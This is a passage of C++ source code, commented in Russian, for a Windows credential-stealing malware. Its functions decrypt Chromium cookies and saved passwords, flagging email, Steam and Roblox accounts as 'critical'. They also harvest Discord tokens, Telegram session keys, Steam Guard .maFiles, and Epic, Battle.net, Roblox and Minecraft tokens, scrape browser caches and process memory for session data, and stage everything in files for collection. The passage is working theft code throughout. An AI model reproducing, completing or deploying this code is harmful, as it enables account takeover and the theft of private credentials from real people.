                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log(QString::fromStdString("Cache path not found for " + browserName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open cache file for " + browserName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + browserName + "] Unsaved Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex passRegex("pass(?:word)?=[^&\\s]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, passRegex)) {
                    result += "[" + browserName + "] Unsaved Password: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex autofillRegex("\"autofill\":\"[^\"]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, autofillRegex)) {
                    result += "[" + browserName + "] Autofill Data: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + browserName + "] Unsaved Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what()));
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log(QString::fromStdString("Cache path not found for " + appName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open cache file for " + appName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    result += "[" + appName + "] Cached Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + appName + "] Cached Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + appName + "] Cached Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealAppCacheData for " + appName + ": " + e.what()));
    }

    return result;
}

// Кража данных Chromium
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath, const std::string& dir) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    std::string cookiesDbPath = dbPath + "Cookies";
    std::string loginDbPath = dbPath + "Login Data";
    sqlite3* db = nullptr;

    // Кража cookies
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                            host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                            host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                            host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                            host.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                        } else {
                            result += "[" + browserName + "] Cookie | " + host + " | " + name + " | " + value + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log(QString::fromStdString("Failed to prepare SQLite statement for cookies in " + browserName));
            }
            sqlite3_close(db);
        } else {
            Log(QString::fromStdString("Failed to open Cookies database for " + browserName));
        }
    }

    // Кража паролей
    db = nullptr;
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
                            url.find("yahoo.com") != std::string::npos || url.find("mail.ru") != std::string::npos ||
                            url.find("aol.com") != std::string::npos || url.find("protonmail.com") != std::string::npos ||
                            url.find("icloud.com") != std::string::npos || url.find("steampowered.com") != std::string::npos ||
                            url.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Password (" + url + ") | " + username + " | " + password + "\n";
                        } else {
                            result += "[" + browserName + "] Password | " + url + " | " + username + " | " + password + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log(QString::fromStdString("Failed to prepare SQLite statement for passwords in " + browserName));
            }
            sqlite3_close(db);
        } else {
            Log(QString::fromStdString("Failed to open Login Data database for " + browserName));
        }
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\" + browserName + "_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved " + browserName + " data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save " + browserName + " data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных браузеров
std::string StealBrowserData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    char* localAppDataPath = nullptr;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    // Путь к данным браузеров
    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\"},
        {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"}
    };

    for (const auto& browser : browserPaths) {
        std::string browserName = browser.first;
        std::string dbPath = browser.second;
        if (std::filesystem::exists(dbPath)) {
            // Копируем базы данных во временные файлы, чтобы избежать блокировки
            std::string tempCookiesDb = dbPath + "Cookies_temp";
            std::string tempLoginDb = dbPath + "Login Data_temp";
            if (g_mainWindow->config.cookies) {
                std::filesystem::copy_file(dbPath + "Cookies", tempCookiesDb, std::filesystem::copy_options::overwrite_existing);
            }
            if (g_mainWindow->config.passwords) {
                std::filesystem::copy_file(dbPath + "Login Data", tempLoginDb, std::filesystem::copy_options::overwrite_existing);
            }

            // Извлекаем данные
            std::string browserData = StealChromiumData(browserName, dbPath, dir);
            if (!browserData.empty()) {
                result += browserData;
            }

            // Удаляем временные файлы
            if (g_mainWindow->config.cookies && std::filesystem::exists(tempCookiesDb)) {
                std::filesystem::remove(tempCookiesDb);
            }
            if (g_mainWindow->config.passwords && std::filesystem::exists(tempLoginDb)) {
                std::filesystem::remove(tempLoginDb);
            }

            // Кража несохраненных данных из кэша
            std::string cachePath = dbPath + "Cache\\";
            std::string unsavedData = StealUnsavedBrowserData(browserName, cachePath);
            if (!unsavedData.empty()) {
                result += unsavedData;
                std::string outputFile = dir + "\\" + browserName + "_unsaved_data.txt";
                std::ofstream outFile(outputFile);
                if (outFile.is_open()) {
                    outFile << unsavedData;
                    outFile.close();
                    Log(QString::fromStdString("Saved " + browserName + " unsaved data to: " + outputFile));
                } else {
                    Log(QString::fromStdString("Failed to save " + browserName + " unsaved data to: " + outputFile));
                }
            }

            // Захват WebSocket и WebRTC сессий
            std::string processName = browserName == "Chrome" ? "chrome.exe" :
                                     browserName == "Edge" ? "msedge.exe" :
                                     browserName == "Opera" ? "opera.exe" :
                                     browserName == "OperaGX" ? "opera.exe" :
                                     browserName == "Yandex" ? "browser.exe" :
                                     browserName == "Brave" ? "brave.exe" : "";
            if (!processName.empty()) {
                std::string wsData = CaptureWebSocketSessions(processName);
                if (!wsData.empty()) {
                    result += wsData;
                    std::string outputFile = dir + "\\" + browserName + "_websocket_data.txt";
                    std::ofstream outFile(outputFile);
                    if (outFile.is_open()) {
                        outFile << wsData;
                        outFile.close();
                        Log(QString::fromStdString("Saved " + browserName + " WebSocket data to: " + outputFile));
                    } else {
                        Log(QString::fromStdString("Failed to save " + browserName + " WebSocket data to: " + outputFile));
                    }
                }
                std::string webrtcData = CaptureWebRTCSessions(processName);
                if (!webrtcData.empty()) {
                    result += webrtcData;
                    std::string outputFile = dir + "\\" + browserName + "_webrtc_data.txt";
                    std::ofstream outFile(outputFile);
                    if (outFile.is_open()) {
                        outFile << webrtcData;
                        outFile.close();
                        Log(QString::fromStdString("Saved " + browserName + " WebRTC data to: " + outputFile));
                    } else {
                        Log(QString::fromStdString("Failed to save " + browserName + " WebRTC data to: " + outputFile));
                    }
                }
            }
        }
    }

    return result;
}

// Кража токенов Discord
std::string StealDiscordTokens(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.discord) return result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for Discord"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    char* appDataPath = nullptr;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Discord"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::vector<std::string> discordPaths = {
        localAppData + "\\Discord\\",
        localAppData + "\\discordcanary\\",
        localAppData + "\\discordptb\\",
        appData + "\\Lightcord\\"
    };

    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");

    for (const auto& path : discordPaths) {
        std::string levelDbPath = path + "Local Storage\\leveldb\\";
        if (std::filesystem::exists(levelDbPath)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(levelDbPath)) {
                    if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                        std::ifstream file(entry.path(), std::ios::binary);
                        if (!file.is_open()) {
                            Log(QString::fromStdString("Failed to open Discord leveldb file: " + entry.path().string()));
                            continue;
                        }

                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();

                        std::smatch match;
                        std::string::const_iterator searchStart(content.cbegin());
                        while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                            std::string token = match[0].str();
                            result += "[Discord] Token: " + token + "\n";
                            searchStart = match.suffix().first;
                        }
                    }
                }
            } catch (const std::exception& e) {
                Log(QString::fromStdString("Error in StealDiscordTokens: " + std::string(e.what())));
            }
        }

        // Кража кэшированных данных
        std::string cachePath = path + "Cache\\";
        std::string cacheData = StealAppCacheData("Discord", cachePath);
        if (!cacheData.empty()) {
            result += cacheData;
        }

        // Захват WebSocket и WebRTC сессий
        std::string wsData = CaptureWebSocketSessions("Discord.exe");
        if (!wsData.empty()) {
            result += wsData;
        }
        std::string webrtcData = CaptureWebRTCSessions("Discord.exe");
        if (!webrtcData.empty()) {
            result += webrtcData;
        }
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\discord_tokens.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Discord tokens to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Discord tokens to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Telegram
std::string StealTelegramData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.telegram) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Telegram"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        Log(QString::fromStdString("Telegram data directory not found: " + telegramPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            if (entry.path().filename().string().find("key_data") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Telegram key_data file: " + entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "[Telegram] Key Data:\n" + content + "\n";
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealTelegramData: " + std::string(e.what())));
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("Telegram.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("Telegram.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\telegram_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Telegram data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Telegram data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Steam
std::string StealSteamData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.steam) return result;

    // Получение пути к установке Steam из реестра
    std::string steamPath;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[1024] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            steamPath = std::string(value);
        }
        RegCloseKey(hKey);
    }

    if (steamPath.empty()) {
        Log(QString("Steam installation path not found"));
        return result;
    }

    // Кража конфигурационных файлов Steam (config.vdf, loginusers.vdf)
    std::string configPath = steamPath + "\\config\\";
    if (std::filesystem::exists(configPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(configPath)) {
                if (entry.path().filename().string().find("config.vdf") != std::string::npos ||
                    entry.path().filename().string().find("loginusers.vdf") != std::string::npos) {
                    std::ifstream file(entry.path());
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Steam config file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "[Steam] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealSteamData (configs): " + std::string(e.what())));
        }
    }

    // Кража .maFile файлов для Steam Guard
    if (g_mainWindow->config.steamMAFile) {
        std::string userDataPath = steamPath + "\\userdata\\";
        if (std::filesystem::exists(userDataPath)) {
            try {
                for (const auto& entry : std::filesystem::directory_iterator(userDataPath)) {
                    if (entry.is_directory()) {
                        std::string maFilesPath = entry.path().string() + "\\7\\";
                        if (std::filesystem::exists(maFilesPath)) {
                            for (const auto& maFile : std::filesystem::directory_iterator(maFilesPath)) {
                                if (maFile.path().extension() == ".maFile") {
                                    std::ifstream file(maFile.path());
                                    if (!file.is_open()) {
                                        Log(QString::fromStdString("Failed to open Steam MA file: " + maFile.path().string()));
                                        continue;
                                    }
                                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                                    file.close();

                                    // Шифрование содержимого .maFile (опционально)
                                    std::string encryptedContent = content;
                                    if (g_mainWindow->config.encryptData) {
                                        try {
                                            encryptedContent = EncryptData(content, g_mainWindow->config.encryptionKey1, g_mainWindow->config.encryptionKey2, g_mainWindow->config.encryptionSalt);
                                            result += "[Steam] Encrypted MA File (" + maFile.path().filename().string() + "):\n" + encryptedContent + "\n";
                                        } catch (const std::exception& e) {
                                            Log(QString::fromStdString("Failed to encrypt MA file: " + std::string(e.what())));
                                            result += "[Steam] MA File (" + maFile.path().filename().string() + "):\n" + content + "\n";
                                        }
                                    } else {
                                        result += "[Steam] MA File (" + maFile.path().filename().string() + "):\n" + content + "\n";
                                    }

                                    // Копируем MA файл в директорию
                                    std::string destPath = dir + "\\" + maFile.path().filename().string();
                                    std::filesystem::copy_file(maFile.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                                    Log(QString::fromStdString("Successfully stole Steam MA file: " + destPath));
                                }
                            }
                        } else {
                            Log(QString::fromStdString("Steam MA files directory not found: " + maFilesPath));
                        }
                    }
                }
            } catch (const std::exception& e) {
                Log(QString::fromStdString("Error in StealSteamData (MA files): " + std::string(e.what())));
            }
        } else {
            Log(QString::fromStdString("Steam userdata directory not found: " + userDataPath));
        }
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("Steam.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("Steam.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\steam_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Steam data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Steam data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Epic Games
std::string StealEpicData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.epic) return result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for Epic Games"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (std::filesystem::exists(epicPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
                if (entry.path().filename().string().find("GameUserSettings.ini") != std::string::npos) {
                    std::ifstream file(entry.path());
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Epic Games config file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "[Epic Games] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealEpicData: " + std::string(e.what())));
        }
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("EpicGamesLauncher.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("EpicGamesLauncher.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\epic_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Epic Games data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Epic Games data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Roblox
std::string StealRobloxData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.roblox) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Roblox"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string robloxPath = appData + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
                if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
                    std::ifstream file(entry.path());
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Roblox config file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "[Roblox] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealRobloxData: " + std::string(e.what())));
        }
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("RobloxPlayerBeta.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\roblox_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Roblox data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Roblox data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Battle.net
std::string StealBattleNetData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.battlenet) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Battle.net"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battleNetPath = appData + "\\Battle.net\\";
    if (std::filesystem::exists(battleNetPath)) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(battleNetPath)) {
                if (entry.path().filename().string().find("Battle.net.config") != std::string::npos) {
                    std::ifstream file(entry.path());
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Battle.net config file: " + entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();
                    result += "[Battle.net] Config File (" + entry.path().filename().string() + "):\n" + content + "\n";
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealBattleNetData: " + std::string(e.what())));
        }
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("Battle.net.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("Battle.net.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\battlenet_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Battle.net data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Battle.net data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Minecraft
std::string StealMinecraftData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.minecraft) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Minecraft"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    // Путь к данным Minecraft
    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        Log(QString::fromStdString("Minecraft directory not found: " + minecraftPath));
        return result;
    }

    // Кража launcher_profiles.json (содержит токены и профили)
    std::string profilesPath = minecraftPath + "launcher_profiles.json";
    if (std::filesystem::exists(profilesPath)) {
        try {
            std::ifstream file(profilesPath);
            if (!file.is_open()) {
                Log(QString::fromStdString("Failed to open Minecraft launcher_profiles.json"));
            } else {
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                // Поиск токенов в содержимом
                std::regex tokenRegex("\"accessToken\":\"[a-zA-Z0-9\\-\\.]+\"");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    result += "[Minecraft] Access Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                // Поиск UUID и имени пользователя
                std::regex uuidRegex("\"uuid\":\"[a-f0-9\\-]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, uuidRegex)) {
                    result += "[Minecraft] UUID: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex usernameRegex("\"name\":\"[^\"]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, usernameRegex)) {
                    result += "[Minecraft] Username: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                // Добавляем весь файл в результат
                result += "[Minecraft] Launcher Profiles:\n" + content + "\n";
                Log(QString::fromStdString("Successfully stole Minecraft launcher_profiles.json"));
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealMinecraftData (launcher_profiles): " + std::string(e.what())));
        }
    }

    // Поиск других файлов, которые могут содержать сессионные данные
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(minecraftPath)) {
            if (entry.path().filename().string().find("usercache.json") != std::string::npos ||
                entry.path().filename().string().find("servers.dat") != std::string::npos) {
                std::ifstream file(entry.path());
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Minecraft file: " + entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "[Minecraft] File (" + entry.path().filename().string() + "):\n" + content + "\n";
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealMinecraftData (files): " + std::string(e.what())));
    }

    // Захват WebSocket и WebRTC сессий
    std::string wsData = CaptureWebSocketSessions("Minecraft.exe");
    if (!wsData.empty()) {
        result += wsData;
    }
    std::string webrtcData = CaptureWebRTCSessions("Minecraft.exe");
    if (!webrtcData.empty()) {
        result += webrtcData;
    }

    // Сохранение результата в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\minecraft_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Minecraft data to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Minecraft data to: " + outputFile));
        }
    }

    return result;
}

// Кража данных Discord (включая историю чатов)
std::string StealDiscordData(const std::string& dir) {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.discord) return result;

    // Используем уже существующий метод StealDiscordTokens для кражи токенов
    std::string tokens = StealDiscordTokens(dir);
